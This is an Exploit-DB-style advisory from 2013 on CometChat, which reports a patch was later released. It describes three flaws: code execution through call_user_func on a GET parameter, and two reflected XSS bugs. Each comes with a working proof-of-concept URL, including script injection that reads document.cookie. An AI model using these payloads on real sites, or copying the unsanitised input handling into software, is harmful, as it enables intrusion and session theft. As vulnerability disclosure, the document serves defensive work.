@@ -1,0 +1,49 @@
+#####################################
+>                                  <
+> #### #### ### ####           ### <
+>    # #    # # #  #           ### <
+>   #  #### ### #  #           ### <
+>  #   #    ##  #  #           ### <
+> #### #### # # ####           ### <
+                               ###  
+> #### #### #    #### # #####  ### <
+> #    #  # #    #  # #   #    ### <
+> #### #### #    #  # #   #        <
+>    # #    #    #  # #   #    ### <
+> #### #    #### #### #   #    ### <
+>				        	   <
+#####################################
+
+# Exploit-DB Note 20-02-2013:
+# A security patch appears to have been released to address the issue:
+# http://www.cometchat.com/blog/cometchat-critical-security-update/
+
+Info:
+All Cometchat Application Multiple Vulnerabilities
+Cometchat is a application which can be used in many site for example phpFox, Wordpress, Joomla, MyBB, Elgg etc.
+Homepage : http://www.cometchat.com
+
+Author: z3r0sPlOiT
+Date: 17.02.2013
+
+Special Thanks: I would like to thank B127Y. He already found two vulnerabilities for Cometchat and because of this I started my research.
+
+
+1.)Code Execution P0C (plugins/otavchat/invite.php)
+194: call_user_func call_user_func($_GET['action']); 
+Can use all php functions and cometchat function without arguments
+
+Live Demo: http://server/cometchat/plugins/otavchat/invite.php?action=phpinfo
+
+2.)XSS P0C (plugins/otavchat/invite.php)
+137: echo echo <<<EOD  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  <html>  <head>  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>   <title>{$otavchat_language[18]}</title>   <link type="text/css" rel="stylesheet" media="all" href="themes/{$theme}/otavchat{$rtl}.css" />   </head>  <body>  <form method="post" action="invite.php?action=inviteusers">  <div class="container2">  <div style="background-color:#3E92BD;border-bottom:1px solid #11648F;">   <div class="invitetitle">{$otavchat_language[16]}</div><div style="float:right"><input type=submit value="{$otavchat_language[17]}" class="invitebutton"></div>   <div style="clear:both"></div>  </div>    <div style="height:162px;overflow-x:hidden;overflow-y:scroll;clear:both;padding-left:5px;padding-top:5px;padding-bottom:5px;">{$s['available']}{$s['away']}{$s['offline']}</div>  </div>    <input type="hidden" name="roomid" value="$id">  </form>  </body>  </html>  EOD; 
+87: $id = $_GET['roomid'];
+
+Live Demo: http://server/cometchat/plugins/otavchat/invite.php?roomid="><script>alert(document.cookie)</script>
+
+
+3. XXS P0C (plugins/filetransfer/index.php)
+87: echo echo <<<EOD  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  <html>  <head>  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>  <title>{$filetransfer_language[0]}</title>   <link type="text/css" rel="stylesheet" media="all" href="themes/{$theme}/filetransfer{$rtl}.css" />   <script type="text/javascript" src="styleinput.js"></script>  </head>    <body><form name="upload" action="upload.php" method="post" enctype="multipart/form-data">  <div class="container">  <div class="container_title">{$filetransfer_language[1]}</div>    <div class="container_body">    <div class="container_body_1">{$filetransfer_language[2]}</div>  <div id="select-0" class="container_body_2"><label class="cabinet"><input type="file" class="file" name="Filedata" onchange="javascript:document.upload.submit()"/></label></div>    <div class="container_body_3">{$filetransfer_language[4]}</div>  <div style="clear:both"></div>      <div class="container_body_4">{$filetransfer_language[3]}</div>    <input type="hidden" name="to" value="{$toId}">  <input type="hidden" name="chatroommode" value="{$chatroommode}">    </div>  </div>  </div>    <script>  SI.Files.stylizeAll();  </script>  </form>  </body>  </html>  EOD; 
+79: $toId = $_GET['id']; 
+
+Live Demo: http://server/cometchat/plugins/filetransfer/index.php?id="><script>alert(document.cookie)</script>
